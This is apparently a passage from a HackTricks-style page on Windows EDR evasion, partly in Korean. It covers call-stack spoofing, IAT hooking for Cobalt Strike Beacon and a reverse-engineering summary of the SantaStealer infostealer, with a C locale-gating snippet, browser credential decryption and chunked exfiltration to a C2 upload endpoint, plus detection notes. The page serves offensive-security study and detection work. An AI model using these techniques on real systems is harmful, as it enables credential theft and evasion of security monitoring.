- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- This defeats detections that expect canonical stacks from Beacon/BOFs to sensitive APIs.
- Pair with stack cutting/stack stitching techniques to land inside expected frames before the API prologue.

Operational integration
- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
- Use an Aggressor script to register target APIs so Beacon and BOFs transparently benefit from the same evasion path without code changes.

Detection/DFIR considerations
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustrates how modern info-stealers blend AV bypass, anti-analysis and credential access in a single workflow.

### Keyboard layout gating & sandbox delay

- A config flag (`anti_cis`) enumerates installed keyboard layouts via `GetKeyboardLayoutList`. If a Cyrillic layout is found, the sample drops an empty `CIS` marker and terminates before running stealers, ensuring it never detonates on excluded locales while leaving a hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 계층화된 `check_antivm` 로직

- Variant A는 프로세스 목록을 순회하며 각 이름을 커스텀 롤링 체크섬으로 해시하고 디버거/샌드박스용으로 포함된 블록리스트와 비교합니다; 동일한 체크섬을 컴퓨터 이름에 대해 반복 검사하고 `C:\analysis` 같은 작업 디렉터리를 확인합니다.
- Variant B는 시스템 속성(프로세스 수 하한, 최근 업타임)을 점검하고 `OpenServiceA("VBoxGuest")`를 호출해 VirtualBox 추가 구성요소를 감지하며, sleep 전후의 타이밍 체크로 single-stepping을 탐지합니다. 어떤 히트가 발생하면 모듈이 시작되기 전에 실행을 중단합니다.

### 파일리스 헬퍼 + 이중 ChaCha20 reflective loading

- 주 DLL/EXE는 Chromium credential helper를 내장하며, 해당 헬퍼는 디스크에 드롭되거나 수동으로 메모리에 매핑됩니다; fileless 모드에서는 imports/relocations를 자체적으로 해결하여 헬퍼 아티팩트가 기록되지 않습니다.
- 그 헬퍼는 ChaCha20으로 두 번 암호화된 2차 스테이지 DLL을 저장합니다(32바이트 키 2개 + 12바이트 논스). 두 패스가 완료되면 blob을 reflective load(즉 `LoadLibrary` 사용 안 함)하고 [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)에서 파생된 exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`를 호출합니다.
- ChromElevator 루틴은 direct-syscall reflective process hollowing을 사용해 라이브 Chromium 브라우저에 인젝션하고 AppBound Encryption 키를 상속받아 ABE hardening에도 불구하고 SQLite 데이터베이스에서 비밀번호/쿠키/신용카드를 직접 복호화합니다.

### 모듈식 인메모리 수집 & 분할된 HTTP exfil

- `create_memory_based_log`는 전역 `memory_generators` 함수 포인터 테이블을 반복하며 활성화된 모듈마다(예: Telegram, Discord, Steam, screenshots, documents, browser extensions 등) 하나의 스레드를 생성합니다. 각 스레드는 결과를 공유 버퍼에 기록하고 약 45초의 join 창 이후 파일 개수를 보고합니다.
- 완료되면 모든 내용은 정적으로 링크된 `miniz` 라이브러리로 압축되어 `%TEMP%\\Log.zip`으로 만들어집니다. `ThreadPayload1`는 15초 동안 sleep한 다음 아카이브를 10 MB 청크로 나누어 HTTP POST로 `http://<C2>:6767/upload`에 스트리밍하며 브라우저 `multipart/form-data` 경계(`----WebKitFormBoundary***`)를 스푸핑합니다. 각 청크에는 `User-Agent: upload`, `auth: <build_id>`, 선택적 `w: <campaign_tag>`가 추가되고 마지막 청크에는 `complete: true`를 덧붙여 C2가 재조립이 완료되었음을 알 수 있게 합니다.

## 참고자료

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)

{{#include ../banners/hacktricks-training.md}}
